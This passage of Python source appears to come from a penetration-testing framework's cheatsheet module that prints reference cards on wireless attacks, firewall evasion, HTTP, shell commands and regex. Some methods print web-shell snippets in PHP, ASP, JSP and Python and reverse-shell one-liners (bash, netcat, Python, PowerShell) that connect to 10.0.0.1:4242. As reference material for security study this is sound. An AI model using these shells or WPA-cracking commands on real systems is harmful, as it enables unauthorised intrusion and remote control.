        print("\n\033[96mWireless Reconnaissance:\033[0m")
        recon_commands = [
            ("airodump-ng wlan0mon", "Scan for networks"),
            ("wash -i wlan0mon", "Scan for WPS"),
            ("reaver -i wlan0mon -b <BSSID>", "WPS attack"),
            ("bully -i wlan0mon -b <BSSID>", "WPS attack alternative"),
        ]

        for cmd, desc in recon_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mWPA/WPA2 Attacks:\033[0m")
        wpa_commands = [
            (
                "airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon",
                "Capture handshake",
            ),
            ("aireplay-ng -0 10 -a <BSSID> wlan0mon", "Deauth attack"),
            ("aircrack-ng -w wordlist.txt capture-01.cap", "Crack password"),
            ("hashcat -m 2500 capture.hccapx wordlist.txt", "GPU cracking"),
        ]

        for cmd, desc in wpa_commands:
            print(f"• {cmd} - {desc}")

    def _network_protocols_reference(self):
        """Display network protocols reference"""
        print("\n\033[93mNETWORK PROTOCOLS REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")

        protocols = {
            "Application Layer": [
                ("HTTP/HTTPS", "Web traffic"),
                ("FTP/SFTP", "File transfer"),
                ("SMTP/POP3/IMAP", "Email"),
                ("DNS", "Domain name resolution"),
                ("DHCP", "IP address assignment"),
            ],
            "Transport Layer": [
                ("TCP", "Reliable connection-oriented"),
                ("UDP", "Unreliable connectionless"),
            ],
            "Network Layer": [
                ("IP", "Internet Protocol"),
                ("ICMP", "Control messages"),
                ("ARP", "Address resolution"),
            ],
            "Data Link Layer": [
                ("Ethernet", "Local network"),
                ("WiFi", "Wireless networking"),
            ],
        }

        for layer, protocol_list in protocols.items():
            print(f"\n\033[95m{layer}\033[0m")
            print("-" * len(layer.encode("ascii", "ignore")))
            for protocol, desc in protocol_list:
                print(f"• {protocol} - {desc}")

    def _firewall_evasion_reference(self):
        """Display firewall evasion reference"""
        print("\n\033[93mFIREWALL EVASION REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")

        print("\n\033[96mNmap Evasion Techniques:\033[0m")
        evasion_commands = [
            ("nmap -f", "Fragment packets"),
            ("nmap --mtu 16", "Custom MTU size"),
            ("nmap -D RND:10", "Decoy hosts"),
            ("nmap -S <spoofed_ip>", "Source IP spoofing"),
            ("nmap -e <interface>", "Specify interface"),
            ("nmap --source-port 53", "Source port spoofing"),
            ("nmap -T1", "Slow timing"),
            ("nmap --max-retries 1", "Reduce retries"),
        ]

        for cmd, desc in evasion_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mGeneral Evasion Techniques:\033[0m")
        techniques = [
            ("Packet Fragmentation", "Split packets into smaller pieces"),
            ("Timing Manipulation", "Slow down scan to avoid detection"),
            ("Source Spoofing", "Use fake source addresses"),
            ("Protocol Manipulation", "Use different protocols"),
            ("Port Hopping", "Scan ports in random order"),
        ]

        for i, (tech, desc) in enumerate(techniques, 1):
            print(f"\n\033[94m{i}. {tech}\033[0m")
            print(f"   {desc}")

    def _http_status_codes_reference(self):
        """Display HTTP status codes reference"""
        print("\n\033[93mHTTP STATUS CODES REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")

        status_codes = {
            "1xx - Informational": [
                ("100", "Continue"),
                ("101", "Switching Protocols"),
                ("102", "Processing"),
            ],
            "2xx - Success": [
                ("200", "OK"),
                ("201", "Created"),
                ("202", "Accepted"),
                ("204", "No Content"),
                ("206", "Partial Content"),
            ],
            "3xx - Redirection": [
                ("301", "Moved Permanently"),
                ("302", "Found"),
                ("304", "Not Modified"),
                ("307", "Temporary Redirect"),
                ("308", "Permanent Redirect"),
            ],
            "4xx - Client Errors": [
                ("400", "Bad Request"),
                ("401", "Unauthorized"),
                ("403", "Forbidden"),
                ("404", "Not Found"),
                ("405", "Method Not Allowed"),
                ("408", "Request Timeout"),
                ("429", "Too Many Requests"),
            ],
            "5xx - Server Errors": [
                ("500", "Internal Server Error"),
                ("501", "Not Implemented"),
                ("502", "Bad Gateway"),
                ("503", "Service Unavailable"),
                ("504", "Gateway Timeout"),
                ("505", "HTTP Version Not Supported"),
            ],
        }

        for category, code_list in status_codes.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))
            for code, desc in code_list:
                print(f"• {code} - {desc}")

    def _http_headers_reference(self):
        """Display HTTP headers reference"""
        print("\n\033[93mHTTP HEADERS REFERENCE\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")

        headers = {
            "Request Headers": [
                ("User-Agent", "Browser identification"),
                ("Accept", "Accepted content types"),
                ("Accept-Language", "Preferred languages"),
                ("Accept-Encoding", "Accepted encodings"),
                ("Authorization", "Authentication credentials"),
                ("Cookie", "Session data"),
                ("Referer", "Previous page"),
                ("Host", "Target hostname"),
            ],
            "Response Headers": [
                ("Content-Type", "Response content type"),
                ("Content-Length", "Response size"),
                ("Set-Cookie", "Set session cookies"),
                ("Location", "Redirect URL"),
                ("Server", "Server information"),
                ("X-Powered-By", "Technology stack"),
                ("X-Frame-Options", "Clickjacking protection"),
                ("Content-Security-Policy", "CSP policy"),
            ],
        }

        for category, header_list in headers.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))
            for header, desc in header_list:
                print(f"• {header} - {desc}")

    def _web_shells_reference(self):
        """Display web shells reference"""
        print("\n\033[93mWEB SHELLS REFERENCE\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")

        print("\n\033[96mCommon Web Shells:\033[0m")
        shells = [
            ("PHP", "<?php system($_GET['cmd']); ?>"),
            (
                "ASP",
                '<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>',
            ),
            ("JSP", '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            ("Python", "import os; os.system(request.args.get('cmd'))"),
        ]

        for lang, code in shells:
            print(f"\n\033[94m{lang}:\033[0m")
            print(f"   \033[92m{code}\033[0m")

        print("\n\033[96mDetection:\033[0m")
        print("• Monitor for suspicious file uploads")
        print("• Check for common web shell signatures")
        print("• Monitor file system changes")
        print("• Use antivirus/EDR solutions")

    def _reverse_shells_reference(self):
        """Display reverse shells reference"""
        print("\n\033[93mREVERSE SHELLS REFERENCE\033[0m")
        print("\033[93m" + "=" * 40 + "\033[0m")

        print("\n\033[96mCommon Reverse Shell Commands:\033[0m")
        shells = [
            ("Bash", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"),
            ("Netcat", "nc -e /bin/bash 10.0.0.1 4242"),
            (
                "Python",
                'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
            ),
            (
                "PowerShell",
                "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            ),
        ]

        for lang, command in shells:
            print(f"\n\033[94m{lang}:\033[0m")
            print(f"   \033[92m{command}\033[0m")

        print("\n\033[96mListener Commands:\033[0m")
        listeners = [
            ("Netcat", "nc -lvp 4242"),
            (
                "PowerShell",
                "powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4242);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"",
            ),
        ]

        for tool, command in listeners:
            print(f"\n\033[94m{tool}:\033[0m")
            print(f"   \033[92m{command}\033[0m")

    def _web_fuzzing_reference(self):
        """Display web fuzzing reference"""
        print("\n\033[93mWEB FUZZING REFERENCE\033[0m")
        print("\033[93m" + "=" * 35 + "\033[0m")

        print("\n\033[96mDirectory Fuzzing:\033[0m")
        dir_commands = [
            (
                "gobuster dir -u http://example.com -w wordlist.txt",
                "Directory bruteforce",
            ),
            ("ffuf -w wordlist.txt -u http://example.com/FUZZ", "Fast fuzzing"),
            ("dirb http://example.com", "Classic directory bruteforce"),
            ("wfuzz -w wordlist.txt http://example.com/FUZZ", "Web fuzzer"),
        ]

        for cmd, desc in dir_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mParameter Fuzzing:\033[0m")
        param_commands = [
            (
                "ffuf -w wordlist.txt -u http://example.com/?param=FUZZ",
                "Parameter fuzzing",
            ),
            (
                "wfuzz -w wordlist.txt http://example.com/?param=FUZZ",
                "Parameter fuzzing",
            ),
            ("arjun -u http://example.com", "Parameter discovery"),
            ("parameth -u http://example.com", "Parameter discovery"),
        ]

        for cmd, desc in param_commands:
            print(f"• {cmd} - {desc}")

        print("\n\033[96mSubdomain Fuzzing:\033[0m")
        subdomain_commands = [
            ("gobuster dns -d example.com -w wordlist.txt", "Subdomain bruteforce"),
            ("ffuf -w wordlist.txt -u http://FUZZ.example.com", "Subdomain fuzzing"),
            ("subfinder -d example.com", "Subdomain enumeration"),
            ("amass enum -d example.com", "Subdomain enumeration"),
        ]

        for cmd, desc in subdomain_commands:
            print(f"• {cmd} - {desc}")

    def _linux_commands_card(self):
        """Display Linux commands quick reference card"""
        print("\n\033[93mLINUX COMMANDS QUICK REFERENCE\033[0m")
        print("\033[93m" + "=" * 45 + "\033[0m")

        commands = {
            "File Operations": [
                ("ls -la", "List files with details"),
                ("cp source dest", "Copy files"),
                ("mv source dest", "Move/rename files"),
                ("rm file", "Remove file"),
                ("rm -rf dir", "Remove directory recursively"),
                ("chmod 755 file", "Change file permissions"),
                ("chown user:group file", "Change ownership"),
            ],
            "Text Processing": [
                ("cat file", "Display file content"),
                ("less file", "View file page by page"),
                ("head -10 file", "Show first 10 lines"),
                ("tail -10 file", "Show last 10 lines"),
                ("grep pattern file", "Search for pattern"),
                ("sed 's/old/new/g' file", "Replace text"),
                ("awk '{print $1}' file", "Process text fields"),
            ],
            "System Information": [
                ("uname -a", "System information"),
                ("whoami", "Current user"),
                ("id", "User and group info"),
                ("ps aux", "Running processes"),
                ("top", "Process monitor"),
                ("df -h", "Disk usage"),
                ("free -h", "Memory usage"),
            ],
            "Network": [
                ("ifconfig", "Network interfaces"),
                ("netstat -tulpn", "Network connections"),
                ("ping host", "Test connectivity"),
                ("nslookup domain", "DNS lookup"),
                ("wget url", "Download file"),
                ("curl url", "HTTP request"),
                ("ssh user@host", "SSH connection"),
            ],
        }

        for category, cmd_list in commands.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))
            for cmd, desc in cmd_list:
                print(f"• {cmd} - {desc}")

    def _windows_commands_card(self):
        """Display Windows commands quick reference card"""
        print("\n\033[93mWINDOWS COMMANDS QUICK REFERENCE\033[0m")
        print("\033[93m" + "=" * 50 + "\033[0m")

        commands = {
            "File Operations": [
                ("dir", "List files"),
                ("copy source dest", "Copy files"),
                ("move source dest", "Move files"),
                ("del file", "Delete file"),
                ("rmdir dir", "Remove directory"),
                ("attrib file", "View file attributes"),
                ("icacls file", "View file permissions"),
            ],
            "System Information": [
                ("systeminfo", "System information"),
                ("whoami", "Current user"),
                ("whoami /priv", "User privileges"),
                ("tasklist", "Running processes"),
                ("taskmgr", "Task manager"),
                ("wmic logicaldisk get size,freespace,caption", "Disk usage"),
                ("wmic memorychip get capacity", "Memory info"),
            ],
            "Network": [
                ("ipconfig", "Network configuration"),
                ("netstat -an", "Network connections"),
                ("ping host", "Test connectivity"),
                ("nslookup domain", "DNS lookup"),
                ("net user", "List users"),
                ("net localgroup administrators", "List admins"),
                ("net share", "List shares"),
            ],
            "Registry": [
                ("reg query key", "Query registry"),
                ("reg add key", "Add registry key"),
                ("reg delete key", "Delete registry key"),
                ("reg export key file", "Export registry"),
                ("reg import file", "Import registry"),
            ],
        }

        for category, cmd_list in commands.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))
            for cmd, desc in cmd_list:
                print(f"• {cmd} - {desc}")

    def _powershell_commands_card(self):
        """Display PowerShell commands quick reference card"""
        print("\n\033[93mPOWERSHELL COMMANDS QUICK REFERENCE\033[0m")
        print("\033[93m" + "=" * 55 + "\033[0m")

        commands = {
            "File Operations": [
                ("Get-ChildItem", "List files (ls)"),
                ("Copy-Item source dest", "Copy files"),
                ("Move-Item source dest", "Move files"),
                ("Remove-Item file", "Delete file"),
                ("Get-Content file", "Read file content"),
                ("Set-Content file content", "Write to file"),
                ("Get-Acl file", "Get file permissions"),
            ],
            "System Information": [
                ("Get-ComputerInfo", "System information"),
                ("Get-Process", "Running processes"),
                ("Get-Service", "Services"),
                ("Get-WmiObject -Class Win32_LogicalDisk", "Disk info"),
                ("Get-WmiObject -Class Win32_PhysicalMemory", "Memory info"),
                ("Get-NetAdapter", "Network adapters"),
                ("Get-NetIPAddress", "IP addresses"),
            ],
            "Active Directory": [
                ("Get-ADUser -Filter *", "List users"),
                ("Get-ADGroup -Filter *", "List groups"),
                ("Get-ADComputer -Filter *", "List computers"),
                ("Get-ADDomain", "Domain information"),
                ("Get-ADForest", "Forest information"),
            ],
            "Network": [
                ("Test-NetConnection host", "Test connectivity"),
                ("Resolve-DnsName domain", "DNS resolution"),
                ("Invoke-WebRequest url", "HTTP request"),
                ("New-NetFirewallRule", "Firewall rules"),
                ("Get-NetTCPConnection", "TCP connections"),
            ],
        }

        for category, cmd_list in commands.items():
            print(f"\n\033[95m{category}\033[0m")
            print("-" * len(category.encode("ascii", "ignore")))
            for cmd, desc in cmd_list:
                print(f"• {cmd} - {desc}")

    def _bash_scripting_card(self):
        """Display bash scripting quick reference card"""
        print("\n\033[93mBASH SCRIPTING QUICK REFERENCE\033[0m")
        print("\033[93m" + "=" * 50 + "\033[0m")

        print("\n\033[96mBasic Syntax:\033[0m")
        syntax = [
            ("#!/bin/bash", "Shebang line"),
            ("# comment", "Comment"),
            ("variable=value", "Variable assignment"),
            ("$variable", "Variable reference"),
            ("${variable}", "Variable reference (braces)"),
            ('"$variable"', "Double quotes (expand variables)"),
            ("'$variable'", "Single quotes (literal)"),
        ]

        for item, desc in syntax:
            print(f"• {item} - {desc}")

        print("\n\033[96mControl Structures:\033[0m")
        controls = [
            ("if [ condition ]; then ... fi", "If statement"),
            ("for var in list; do ... done", "For loop"),
            ("while [ condition ]; do ... done", "While loop"),
            ("case $var in ... esac", "Case statement"),
            ("function name() { ... }", "Function definition"),
        ]

        for item, desc in controls:
            print(f"• {item} - {desc}")

        print("\n\033[96mFile Tests:\033[0m")
        tests = [
            ("[ -f file ]", "File exists"),
            ("[ -d dir ]", "Directory exists"),
            ("[ -r file ]", "File is readable"),
            ("[ -w file ]", "File is writable"),
            ("[ -x file ]", "File is executable"),
            ("[ -s file ]", "File is not empty"),
        ]

        for item, desc in tests:
            print(f"• {item} - {desc}")

        print("\n\033[96mString Tests:\033[0m")
        string_tests = [
            ("[ -z string ]", "String is empty"),
            ("[ -n string ]", "String is not empty"),
            ("[ string1 = string2 ]", "Strings are equal"),
            ("[ string1 != string2 ]", "Strings are not equal"),
        ]

        for item, desc in string_tests:
            print(f"• {item} - {desc}")

    def _regex_reference_card(self):
        """Display regular expressions quick reference card"""
        print("\n\033[93mREGULAR EXPRESSIONS QUICK REFERENCE\033[0m")
        print("\033[93m" + "=" * 55 + "\033[0m")

        print("\n\033[96mBasic Patterns:\033[0m")
        patterns = [
            (".", "Any character except newline"),
            ("\\w", "Word character [a-zA-Z0-9_]"),
            ("\\d", "Digit [0-9]"),
            ("\\s", "Whitespace character"),
            ("\\W", "Non-word character"),
            ("\\D", "Non-digit character"),
            ("\\S", "Non-whitespace character"),
        ]

        for pattern, desc in patterns:
            print(f"• {pattern} - {desc}")

        print("\n\033[96mQuantifiers:\033[0m")
        quantifiers = [
            ("*", "Zero or more"),
            ("+", "One or more"),
            ("?", "Zero or one"),
            ("{n}", "Exactly n times"),
            ("{n,}", "n or more times"),
            ("{n,m}", "Between n and m times"),
        ]

        for quantifier, desc in quantifiers:
            print(f"• {quantifier} - {desc}")

        print("\n\033[96mAnchors:\033[0m")
        anchors = [
            ("^", "Start of line"),
            ("$", "End of line"),
            ("\\b", "Word boundary"),
            ("\\B", "Non-word boundary"),
        ]

        for anchor, desc in anchors:
            print(f"• {anchor} - {desc}")

        print("\n\033[96mCharacter Classes:\033[0m")
        classes = [
            ("[abc]", "Any of a, b, or c"),
            ("[^abc]", "Not a, b, or c"),
            ("[a-z]", "Any lowercase letter"),
            ("[A-Z]", "Any uppercase letter"),
            ("[0-9]", "Any digit"),
            ("[a-zA-Z]", "Any letter"),
        ]

        for class_pattern, desc in classes:
            print(f"• {class_pattern} - {desc}")

        print("\n\033[96mCommon Examples:\033[0m")
        examples = [
            ("\\b\\w+@\\w+\\.\\w+\\b", "Email address"),
            ("\\b\\d{3}-\\d{3}-\\d{4}\\b", "Phone number (US)"),
            ("\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", "IP address"),
            ("^https?://", "URL protocol"),
        ]

        for example, desc in examples:
            print(f"• {example} - {desc}")

    def _export_all_cheatsheets_json(self, output_dir: str, timestamp: str):
        """Export all cheatsheets to JSON format"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            filename = f"{output_dir}/cheatsheets_{timestamp}.json"

            # Collect all cheatsheet data
            all_data = {
                "nmap": self._get_nmap_data(),
                "metasploit": self._get_metasploit_data(),
                "sqlmap": self._get_sqlmap_data(),
                "custom_commands": self.custom_commands,
                "favorites": list(self.favorites),
            }

            with open(filename, "w") as f:
                json.dump(all_data, f, indent=2)

            self.print_success(f"Cheatsheets exported to {filename}")

        except Exception as e:
            self.print_error(f"Export failed: {e}")

    def _get_nmap_data(self):
        """Get Nmap cheatsheet data"""
        return {
            "Basic Scans": [
                {"command": "nmap 192.168.1.1", "description": "Basic port scan"},
                {"command": "nmap -sn 192.168.1.0/24", "description": "Ping scan"},
                {"command": "nmap -sS 192.168.1.1", "description": "SYN stealth scan"},
            ],
            "Advanced": [
                {"command": "nmap -A 192.168.1.1", "description": "Aggressive scan"},
                {
                    "command": "nmap --script vuln 192.168.1.1",
                    "description": "Vulnerability scan",
                },
            ],
        }

    def _get_metasploit_data(self):
        """Get Metasploit cheatsheet data"""
        return {
            "Basic Commands": [
                {"command": "msfconsole", "description": "Start Metasploit console"},
                {"command": "search <term>", "description": "Search for modules"},
                {"command": "use <module>", "description": "Use a module"},
            ],
        }

    def _get_sqlmap_data(self):
        """Get SQLMap cheatsheet data"""
        return {
            "Basic Usage": [
                {
                    "command": "sqlmap -u '<url>'",
                    "description": "Basic SQL injection test",
                },
                {
                    "command": "sqlmap -u '<url>' --dbs",
                    "description": "Enumerate databases",
                },
            ],
        }

    def _export_custom_commands(self, output_dir: str, timestamp: str):
        """Export custom commands to JSON"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            filename = f"{output_dir}/custom_commands_{timestamp}.json"

            with open(filename, "w") as f:
                json.dump(self.custom_commands, f, indent=2)

            self.print_success(f"Custom commands exported to {filename}")

        except Exception as e:
            self.print_error(f"Export failed: {e}")

    def _export_favorites(self, output_dir: str, timestamp: str):
        """Export favorites to JSON"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            filename = f"{output_dir}/favorites_{timestamp}.json"

            favorites_data = {
                "favorites": list(self.favorites),
                "exported_at": datetime.now().isoformat(),
            }

            with open(filename, "w") as f:
                json.dump(favorites_data, f, indent=2)

            self.print_success(f"Favorites exported to {filename}")

        except Exception as e:
            self.print_error(f"Export failed: {e}")

    def _create_pdf_cheatsheet(self, output_dir: str, timestamp: str):
        """Create PDF cheatsheet (placeholder)"""
        try:
            os.makedirs(output_dir, exist_ok=True)
            filename = f"{output_dir}/cheatsheets_{timestamp}.pdf"

            # This would require a PDF library like reportlab
            # For now, just create a placeholder
            with open(filename, "w") as f:
                f.write("PDF cheatsheet would be generated here\n")
                f.write("Requires PDF generation library\n")

            self.print_success(f"PDF cheatsheet created at {filename}")
            self.print_info(
                "Note: This is a placeholder. Install reportlab for actual PDF generation."
            )

        except Exception as e:
            self.print_error(f"PDF creation failed: {e}")

    def _generate_comprehensive_cheatsheet_html(self) -> str:
        """Generate comprehensive HTML cheatsheet"""
        html_content = (
            """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leegion Framework - Cybersecurity Cheatsheets</title>
    <style>
        body { font-family: 'Courier New', monospace; margin: 20px; }
        .header { text-align: center; color: #333; border-bottom: 2px solid #333; }
        .section { margin: 20px 0; }
        .section h2 { color: #0066cc; border-bottom: 1px solid #0066cc; }
        .command { background: #f5f5f5; padding: 5px; margin: 5px 0; }
        .description { color: #666; margin-left: 20px; }
        .category { margin: 15px 0; }
        .category h3 { color: #009900; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Leegion Framework v2.0</h1>
        <h2>Cybersecurity Tool Cheatsheets</h2>
        <p>Generated on: """
            + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            + """</p>
    </div>

    <div class="section">
        <h2>Nmap Commands</h2>
        <div class="category">
            <h3>Basic Scans</h3>
            <div class="command">nmap 192.168.1.1</div>
            <div class="description">Basic port scan</div>
            <div class="command">nmap -sn 192.168.1.0/24</div>
            <div class="description">Ping scan for host discovery</div>
        </div>
    </div>

    <div class="section">
        <h2>Metasploit Commands</h2>
        <div class="category">
            <h3>Basic Commands</h3>
            <div class="command">msfconsole</div>
            <div class="description">Start Metasploit console</div>
            <div class="command">search &lt;term&gt;</div>
            <div class="description">Search for modules</div>
        </div>
    </div>

    <div class="section">
        <h2>SQLMap Commands</h2>
        <div class="category">
            <h3>Basic Usage</h3>
            <div class="command">sqlmap -u '&lt;url&gt;'</div>
            <div class="description">Basic SQL injection test</div>
            <div class="command">sqlmap -u '&lt;url&gt;' --dbs</div>
            <div class="description">Enumerate databases</div>
        </div>
    </div>
</body>
</html>
        """
        )
        return html_content
